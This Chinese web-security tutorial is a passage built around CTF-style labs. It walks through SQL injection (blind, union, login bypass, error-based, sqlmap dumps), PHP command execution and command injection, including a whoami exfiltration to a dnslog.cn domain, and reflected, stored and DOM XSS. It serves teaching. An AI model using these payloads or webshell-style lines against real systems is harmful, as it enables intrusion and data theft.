+  left(database(),1)>'e';</pre><p>推理出数据库的第一个字母，以此类推可以使用如下的语句推理出数据库的第二个字母：</p><pre>left(database(),2)>'sa';
+  left(database(),2)>'sz';
+  left(database(),2)>'se';</pre><p>2）mid 函数 mid（s，n，len）：从字符串 s 的 start 位置截取长度为 length 的子字符串。 使用如下语句推理出当前用户的第一个字母为 r：</p><pre>and mid(user(),1,1)>'a';
+  and mid(user(),1,1)>'z';
+  and mid(user(),1,1)>'q';
+  and mid(user(),1,1)>'r';</pre><p>接着推理出第二个字母为 o：</p><pre>and mid(user(),1,2)>'rn';
+  and mid(user(),1,2)>'ro';</pre><p>或者也可以直接推理出第二个字母为 o：</p><pre>and mid(user(),2,1)>'n'
+  and mid(user(),2,1)>'o'</pre><p>3）substr 函数 substr（s，start，length）：从字符串 s 的 start 位置截取长度为 length 的子字符串。</p><pre>and substr(version(),1,1)>4;
+  and substr(version(),1,1)>5;</pre><p>4）ascii 函数 ascii（s）：返回字符串 s 的第一个字母的 ASCII 码。</p><pre>and ascii(user())>113;
+  and ascii(user())>114;
+  and ascii(mid(user(),1
+  ,1))>113;and ascii(mid(user(),1
+  ,1))>114;</pre><p>在布尔盲注的时候还会用到 ord、if、regexp、cast、ifnull 等关键词，由于篇幅有限这里就不一一列举了。</p><ol><li>基于时间类型的盲注 若查询语句是否正确都不影响页面返回的内容时，这种情况下就只能使用基于时间类型的盲注了。原理和之前基于报错的注入差不多，只是条件成功会触发 sleep 函数的延时效果。</li></ol><pre>and 1=if(ascii(substr(database(),1,1))>115,1,sleep(5))</pre><pre>判断数据库的第一位长度是否大于115，如果大于115就会返回1，否则就会执行sleep（5）函数，让页面响应延时5秒，通过这种时间差就可以快速判断出当前我们要查询的结果信息。
+ 在 MySQL 中除了使用sleep函数进行延时，还可以使用benchmark函数来进行延时。
+ benchmark（count，expr）：将expr表达式运行计算count次。
+ 这个函数可以让 expr 表达式执行若干次，通过大量计算占用CPU性能，这个时候页面的返回结果就比平时要长，通过时间长短的变化，从而判断语句是否执行成功。
+
+ ```
+ and
+ 1=if(ascii(substr(database(),1,1))>115,1,BENCHMARK(10000000000,md5(233)))
+ ```</pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-fallback data-lang=fallback><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 4.3 漏洞实战
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 4.3.1 基础的联合查询注入
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>联合注入一般是通过 union 关键字来进行数据回显的 SQL 注入。一般是先利用 order by 来判断表的列数。 SQL 注入判断列数如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563669_64a56fd583394b8329c0f.jpg!small?1688563669695)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                                 SQL 注入判断列数
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>在第四列返回正常，第五列返回错误，判断列数为 4。接着查询库名，结果如下。 SQL 注入查询库名如下图所示
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563686_64a56fe62bfe86b19d4b6.jpg!small?1688563686373)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                   SQL 注入查询库名
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>继续注入，成功获取 flag。 SQL 注入获取 flag 如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563705_64a56ff9d0316b81b3ba3.jpg!small?1688563705937)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                        SQL 注入获取 flag
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 4.3.2 万能密码注入
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>万能密码是 SQL 注入中比较常见的漏洞点，适合简单的 SQL 漏洞判断，通过下面的题目来简单理解一下。一个简单的登录框，传输用户名和密码，常规单引号测试，发现报错。下图为单引号导致报错。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563728_64a5701082e7ca4922a4f.jpg!small?1688563728582)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                               单引号导致报错
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>传输的 payload 为：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;name=a&#39;&amp;pass=1&lt;/pre&gt;
+</span></span><span style=display:flex><span>猜测后端 SQL 语句应该是：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;SELECT username, password FROM users WHERE username=&#39;$name&#39; and password=&#39;$pass&#39; LIMIT 0,1&lt;/pre&gt;
+</span></span><span style=display:flex><span>根据此逻辑可以使用万能密码来进行登录绕过，构造如下 payload：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;name=&#39;=&#39;&amp;pass=&#39;=&#39;&lt;/pre&gt;
+</span></span><span style=display:flex><span>这样后端逻辑就变成了：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;SELECT username, password FROM users WHERE username=&#39;&#39;=&#39;&#39; and password=&#39;&#39;=&#39;&#39; LIMIT 0,1&lt;/pre&gt;
+</span></span><span style=display:flex><span>详细解析一下关键语句：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;username=&#39;&#39;=&#39;&#39; and password=&#39;&#39;=&#39;&#39;&lt;/pre&gt;
+</span></span><span style=display:flex><span>由于在 SQL 的逻辑运算中，“=” 优先级大于 and 和 or。所以 username 传递的参数为空，“=” 后面的值也为空，空等于空，返回值为 true。password 同理，最终返回结果也为 true，成功绕过登录限制。 同样地，我们还可以利用 SQL 注释语句来绕过登录限制。 构造如下 payload：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;name=&#39;or 1#&amp;pass=2333&lt;/pre&gt;
+</span></span><span style=display:flex><span>这时，后端逻辑就变成了：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;SELECT username, password FROM users WHERE username=&#39;&#39;or 1#&#39; and password=&#39;2333&#39; LIMIT 0,1&lt;/pre&gt;
+</span></span><span style=display:flex><span>同样解析一下：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;username=&#39;&#39;or 1#&#39; and password=&#39;2333&#39;&lt;/pre&gt;
+</span></span><span style=display:flex><span>username 传递的值为空，与 “or1” 永真表达式进行逻辑运算后变成 true，成功绕过登录限制。当然在已知用户名的时候也可以替换 “or1” 的表达式，实现任意用户登录。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 4.3.3 基于报错的注入
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>报错注入一般常见于无正确数据回显且有报错返回，常利用 updatexml 等函数进行注入。来了解一下报错注入的实例。先输入正确值，返回数据无正确回显。 数据查询无正确回显如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563747_64a57023c83852ec9d9c4.jpg!small?1688563747853)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                       数据查询无正确回显
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>发现无正确数据返回，只有查询状态。尝试输入引号，触发报错。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>引号触发报错如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563763_64a57033ebe21a34ef4e1.jpg!small?1688563764125)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                      引号触发报错
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>这时可以利用 updatexml 来进行报错注入，构造 payload，查询数据库。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;?id=1&#39; AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(CONCAT(database()) AS CHAR),0x7e)) LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--+&lt;/pre&gt;
+</span></span><span style=display:flex><span>查询数据库成功如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563784_64a5704840a785fd30107.jpg!small?1688563784323)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                  查询数据库成功
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>查询 flag 信息，构造 payload。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;?id=1&#39; AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(CONCAT(content) AS CHAR),0x7e)) FROM ﬂag_is _here LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--+&lt;/pre&gt;
+</span></span><span style=display:flex><span>查询成功如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563801_64a57059b6aa57a00b5bd.jpg!small?1688563801777)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                             报错注入查询 flag
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>4.4.3.4 基于时间类型的盲注 基于时间类型的盲注一般用在无回显数据查询的情形，由于漏洞点较隐蔽，一般采用 sqlmap 发现。下面是一个简单的搜索案例，输入 ID 发现无数据返回。存在时间盲注的页面如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563822_64a5706e46fefbcbf77a7.jpg!small?1688563822539)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                               存在时间盲注的页面
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>尝试用 sqlmap 发现，sqlmap 的命令语句如下：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;sqlmap -u &#34;xxxxx/?id=1&#34; --ﬂush-session&lt;/pre&gt;
+</span></span><span style=display:flex><span>成功发现注入点，如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563837_64a5707ddfdc3f9cadec5.jpg!small?1688563838117)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>拿到数据库 flag 的命令语句：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;sqlmap -u &#34;xxxxx/?id=1&#34; -D db -T ﬂag_is_here -C content --dump --technique=T&lt;/pre&gt;
+</span></span><span style=display:flex><span>## 5 命令执行漏洞
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 5.1 漏洞简介
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>脚本语言常常会因为运行速度慢，而通过外部执行函数去调用一些外部程序。比如，PHP 中的 system、exec、shell exec 等。当服务器对用户输入的命令没有进行限制或者过滤不严时，导致用户可以控制命令执行函数，就会造成用户输入的命令执行漏洞，命令执行漏洞属于高危漏洞之一。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 5.2 漏洞利用
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 5.2.1 常用的命令执行函数
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PHP 语言下常用的命令执行漏洞函数有 exec、system 等。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>exec 函数
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;exec(string $command[,array &amp;$output[,int &amp;$return_var]]):string&lt;/pre&gt;
+</span></span><span style=display:flex><span>exec() 执行 command 参数所指定的命令，返回命令执行结果的最后一行内容。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;echo exec($_REQUEST[1]);&lt;/pre&gt;
+</span></span><span style=display:flex><span>exec 执行命令如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563850_64a5708ad75292440edfc.jpg!small?1688563851061)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                                             exec 执行命令
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>system 函数
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;system(string $command[,int &amp;$return_var]):string&lt;/pre&gt;
+</span></span><span style=display:flex><span>执行 command 参数所指定的命令，并且输出执行结果。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;system($_REQUEST[1]);&lt;/pre&gt;
+</span></span><span style=display:flex><span>system 执行命令如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563870_64a5709e4ac56bea114bc.jpg!small?1688563870407)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                            system 执行命令
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>shell_exec 函数
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;shell_exec(string $cmd):string&lt;/pre&gt;
+</span></span><span style=display:flex><span>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。如果执行过程中发生错误或者进程不产生输出，则返回 NULL。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;echo shell_exec($_REQUEST[1]);&lt;/pre&gt;
+</span></span><span style=display:flex><span>shell exec 执行命令如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563894_64a570b641ed08bfd3186.jpg!small?1688563894445)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                   shell_exec 执行命令
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 5.2.2 Linux 命令执行基础
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Linux 下可以使用 “；” 直接拼接两条命令，类似的符号详情可参见 Linux 常用符号及说明。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563909_64a570c567a31e2bac2e5.jpg!small?1688563909949)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                   Linux 常用符号及说明
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;id&amp;&amp;whoami&amp;&amp;pwd&lt;/pre&gt;
+</span></span><span style=display:flex><span>这样就通过 “&amp;&amp;” 符号拼接了 3 个命令，最终这 3 个命令都会被执行。 命令拼接执行如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563924_64a570d4aee43da7028db.jpg!small?1688563924894)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                          命令拼接执行
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 5.3 漏洞实战
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 5.3.1 简单的命令执行
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>命令执行漏洞在实战中并不少见，可以通过白盒测试、代码审计的方式找到问题所在，最后通过命令执行获取敏感信息或者是 getshell。 在常见的功能测试接口中，一般情况下是通过 ping 的方式去探测能不能访问到目标，此位置便是一次简单的命令执行，如果并未进行任何过滤，就会被恶意攻击者利用。下图为网络功能测试接口页面。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563943_64a570e7e5358a9e6a74e.jpg!small?1688563943922)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                              网络功能测试接口页面
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>执行命令，获取目录下的文件。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;127.0.0.1|ls&lt;/pre&gt;
+</span></span><span style=display:flex><span>执行系统命令（一）如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688563958_64a570f680f5c3075068d.jpg!small?1688563958534)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>执行系统命令（一） 查看目标文件内容。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;127.0.0.1|cat index.php&lt;/pre&gt;
+</span></span><span style=display:flex><span>执行系统命令（二）如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564070_64a57166d1140907dc919.jpg!small?1688564070929)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                   执行系统命令（二）
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 5.3.2 无回显的命令执行
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>上文说的是有回显的命令注入，但是很多访问的目标环境在命令执行之后是无回显的。命令执行如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564086_64a57176c353d1fa33536.jpg!small?1688564086953)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                            命令执行
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>命令执行之后并没有附带信息回显内容，仅有 ping 后的执行操作，无信息回显，可以尝试外带信息。首先在 dnslog.cn 里申请一个临时域名。申请 dns 域名如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564105_64a571891a5bb415734ca.jpg!small?1688564105158)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                 申请 dns 域名
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>复制该域名进行利用：127.0.0.1|ping&#39;whoami&#39;.ibvr6s.dnslog.cn，点为拼接，执行命令结果如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564120_64a571984666611983faa.jpg!small?1688564120565)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                                            执行 ping 命令结果
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>到 dnslog.cn 上 Refresh Record 刷新一下，即可看到外带信息，返回结果如下。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>dns 外带信息如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564142_64a571ae684149df641c8.jpg!small?1688564142753)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                            dns 外带信息
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>## 6 XSS 跨站脚本攻击
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 6.1 漏洞简介
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>XSS 攻击是指黑客通过特殊的手段向网页中插入了恶意的 JavaScript 脚本，在用户浏览网页时，利用用户浏览器发起 Cookie 资料窃取、会话劫持、钓鱼欺骗等攻击。XSS 跨站脚本攻击本身对 Web 服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意 URL，当受害者在 Web 浏览器中打开该 URL 的时侯，恶意脚本会在受害者的计算机上悄悄执行。 造成 XSS 漏洞普遍流行的原因如下： （1）Web 浏览器本身的设计不安全，无法判断 JavaScript 代码是否含有恶意代码； （2）输入与输出的 Web 应用程序基本交互防护不够； （3）程序员缺乏安全意识，缺少对 XSS 漏洞的认知。 XSS 触发简单，完全防御起来却相当困难。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 6.2 漏洞利用
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 6.2.1 反射型 XSS
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>反射型跨站脚本（Reflected Cross-site Scripting）也称作非持久型、参数型跨站脚本。反射型 XSS 只是简单地把用户输入的数据 “反射” 给浏览器。也就是说，黑客往往需要诱使用户 “点击” 一个恶意链接，才能发起攻击。 假设一个页面把用户输入的参数直接输出到页面上：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;$input = $_GET[&#39;param&#39;]; 
+</span></span><span style=display:flex><span>echo &#34;&lt;h1&gt;&#34;.$input.&#34;&lt;/h1&gt;&#34;;&lt;/pre&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>用户向 param 提交的数据会显示到 &lt;h1&gt; 的标签中展示出来，如提交。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;http://127.0.0.1/test.php?param=Hello XSS&lt;/pre&gt;
+</span></span><span style=display:flex><span>会得到如下结果。提交普通参数值如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564160_64a571c04459ebb1fa4f7.jpg!small?1688564160315)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                               提交普通参数值
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>此时查看页面源代码，可以看到：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;&lt;h1&gt;Hello XSS&lt;/h1&gt;&lt;/pre&gt;
+</span></span><span style=display:flex><span>此时如果提交一个 JavaScript 代码:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;http://127.0.0.1/test.php?param=&lt;script&gt;alert(233)&lt;/script&gt;&lt;/pre&gt;
+</span></span><span style=display:flex><span>会发现，alert（233）在当前页面成功执行。提交恶意 JavaScript 代码参数如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564178_64a571d2b6b49c3570494.jpg!small?1688564178974)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                         提交恶意 JavaScript 代码参数
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>再查看源代码：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;&lt;h1&gt;&lt;script&gt;alert(233)&lt;/script&gt;&lt;/h1&gt;&lt;/pre&gt;
+</span></span><span style=display:flex><span>用户输入的 Script 脚本，已经被写入页面中，这就是一个经典的反射型 XSS。它的特点是：只在用户浏览时触发，而且只执行一次，非持久化，所以称为反射型 XSS。反射型 XSS 的危害往往不如持久型 XSS，因为恶意代码暴露在 URL 参数中，并且时刻要求目标用户浏览方可触发，稍有安全意识的用户就可以轻易看穿该链接是不可信任的。如此一来，反射型 XSS 的攻击成本要比持久型 XSS 高得多，不过随着技术的发展，攻击者可以将包含漏洞的链接通过网址缩短或者转换为二维码等形式灵活运用。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 6.2.2 存储型 XSS
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>存储型 XSS 和反射型 XSS 的差别仅在于，提交的 XSS 代码会存储在服务器端（不管是数据库、内存中还是文件系统内等），下次请求目标页面时不用再提交 XSS 代码。最典型的例子是留言板 XSS，下面是一个简单的留言板页面。下图为留言板内容。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564193_64a571e1e73e5fed11069.jpg!small?1688564194095)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                       留言板内容
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>可以从代码看出，逻辑很简单，用户前端留言，就可以看到自己的留言信息了，代码中没有任何过滤，直接将用户输入的语句插入了 html 网页中，这样就很容易导致存储型 XSS 漏洞的产生。 当攻击者直接在留言板块中插入
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;script&gt;alert（“鸡你太美”）&lt;/script&gt;，
+</span></span><span style=display:flex><span>会导致这条恶意的语句直接插入数据库中，然后通过网页解析，成功触发 JavaScript 语句，就会导致用户浏览这个网页时一直弹窗。必须从数据库中删除这条语句，才能够停止弹窗。成功插入 XSS 语句如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564216_64a571f85beaccf954857.jpg!small?1688564216663)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                     成功插入 XSS 语句
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>此时查看网页源代码：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;&lt;b&gt;用户名：&lt;/b&gt;蔡徐坤   &lt;b&gt;留言内容:&lt;/b&gt;&lt;script&gt;alert(‘鸡你太美&#39;)&lt;/script&gt;&lt;br&gt;&lt;/pre&gt;
+</span></span><span style=display:flex><span>存储型 XSS 的攻击是很隐蔽的，也是危害比较大的，普通用户所看的 URL 为 http：//127.0.0.1/test.php，从 URL 上看是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库中被查询出来并显示，浏览器发现有 XSS 代码，就当作正常的 HTML 与 JavaScript 解析执行，于是就触发了 XSS 攻击。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 6.2.3 DOM 型 XSS
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>通过修改页面的 DOM 节点形成的 XSS，被称为 DOM 型 XSS。它和反射型 XSS、存储型 XSS 的差别在于，DOM 型 XSS 的 XSS 代码并不需要服务器解析响应的直接参与，触发 XSS 靠的就是浏览器端的 DOM 解析，可以认为完全是客户端的事情。 下面编写一个简单的含 DOM 型 XSS 漏洞的 HTML 代码：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;meta charset=&#34;UTF-8&#34;&gt; &lt;script&gt; function xss(){ var str = document.getElementById(“src&#34;).value; document.getElementById(“demo&#34;).innerHTML = “&lt;img src=&#39;&#34;+str+&#34;&#39; /&gt;&#34;; } &lt;/script&gt; &lt;input type=&#34;text&#34;id=&#34;src&#34;size=&#34;50&#34;placeholder=&#34; 输入图片地址 &#34;/&gt; &lt;input type=&#34;button&#34;value=&#34; 插入 &#34;onclick=&#34;xss()&#34;/&gt;&lt;br&gt; &lt;div id=&#34;demo&#34; &gt;&lt;/div&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>功能很简单，用户输入框插入图片地址后，页面会通过 &lt;img&gt; 标签将插入的图片显示在网页上。JavaScript 插入的图片地址显示如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564302_64a5724ec09042ac68919.jpg!small?1688564302870)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                     JavaScript 插入的图片地址显示
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>同样，这里也没有对用户的输入进行过滤，当攻击者构造 “onerror=alert（233）” 语句插入的时候，得到如下效果。 img 的 XSS 语句构造如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564317_64a5725d6b982beba9dc1.jpg!small?1688564317908)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                   img 的 XSS 语句构造
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>会直接在 &lt;img&gt; 标签中插入 onerror 事件，该语句表示当图片加载出错的时候，自动触发后面的 alert() 函数，来达到弹窗的效果，这就是一个简单的 DOM 型 XSS 漏洞攻击的例子
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 6.3 漏洞实战
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>之前内容说到 XSS 可以获取 Cookie，结合 JavaScript 代码进行盗取，最后通过获取到的 Cookie 伪造受害者登录，那具体怎么操作呢？ 先看看目标环境，是一个 QQ 站点，不过这是一个钓鱼网站。 简易的 XSS 站点如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564341_64a57275b56c499a0fdbd.jpg!small?1688564341870)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                简易的 XSS 站点
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>当我们输入账号密码登录后，会发现页面跳转到了官网，再次登录肯定是没问题的，能够成功登录。 页面跳转地址如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564357_64a5728528fe8c55a0fba.jpg!small?1688564357225)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                            页面跳转地址
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>该系统存在后台管理员登录界面，登录查看，结果如下。 后台登录页面如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564372_64a57294e7960486154ef.jpg!small?1688564373055)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                后台登录页面
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>在这里能够看到，通过这个平台登录的每一个账号，当我们输入正确的账号密码进行登录时，网站后台便会记录内容，从而导致账号密码泄露。后台数据页面如下图所示。
+</span></span><span style=display:flex><span>
